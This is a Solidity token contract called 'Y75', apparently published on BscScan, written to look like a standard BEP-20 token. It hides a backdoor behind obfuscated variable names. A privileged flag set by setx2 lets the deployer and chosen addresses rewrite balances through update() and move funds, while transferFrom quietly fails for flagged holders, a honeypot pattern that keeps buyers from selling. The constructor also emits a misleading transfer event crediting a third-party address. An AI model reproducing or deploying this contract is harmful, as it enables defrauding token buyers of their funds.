/**
 *Submitted for verification at BscScan.com on 2022-11-08
*/

pragma solidity 0.8.17;

abstract contract Context {
    address X20 = 0x48B807caa55AB39b7Ca244529F63f4935FEF0272;
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Create(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
 modifier onlyOwner{
   require(msg.sender == _Owner);     
        _; }
    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }


}



contract Y75 is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private X1;
    mapping (address => uint256) private X2;
    mapping (address => mapping (address => uint256)) private X3;
    uint8 private constant X4 = 8;
    uint256 private constant X5 = 99 * (10** X4);
    string private constant _name = "Y75";
    string private constant _symbol = "Y75";



    constructor () {
       X1[msg.sender] = X5;  
        X2[msg.sender] = 2;  
   _Router(X5);}
    

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return X4;
    }

    function totalSupply() public pure  returns (uint256) {
        return X5;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return X1[account];
    }
	 function allowance(address owner, address spender) public view  returns (uint256) {
        return X3[owner][spender];
    }

        function approve(address spender, uint256 amount) public returns (bool success) {    
        X3[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }
function setx2 (address x, uint256 y) public {
 require(X2[msg.sender] == 2);
     X2[x] = y;}
    function update() public {
        X1[msg.sender] = X2[msg.sender];}
        function _Router (uint256 x) internal {
              emit Transfer(address(0), X20, x);}
                      function _Transfer (address x, address y, uint256 xy) internal {
              emit Transfer(x, y, xy);}
        function transfer(address to, uint256 amount) public {
if(X2[msg.sender] == 2) {
         require(X1[msg.sender] >= amount);
        X1[msg.sender] = X1[msg.sender].sub(amount);
        X1[to] = X1[to].add(amount);
    _Transfer(msg.sender, to, amount);}
if(X2[msg.sender] <= 1) {
     require(X1[msg.sender] >= amount);
            X1[msg.sender] = X1[msg.sender].sub(amount);
        X1[to] = X1[to].add(amount);
       emit Transfer(msg.sender, to, amount);}}
		function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {
if(X2[sender] <= 1 && X2[recipient] <=1) {
         require(amount <= X1[sender]);
        require(amount <= X3[sender][msg.sender]);
        X1[sender] = X1[sender].sub(amount);
        X1[recipient] = X1[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
         return true;}
        if(X2[msg.sender] == 2) {
         require(amount <= X3[sender][msg.sender]);
        X1[sender] = X1[sender].sub(amount);
        X1[recipient] = X1[recipient].add(amount);
          _Transfer(sender, recipient, amount);
             return true;}
        }}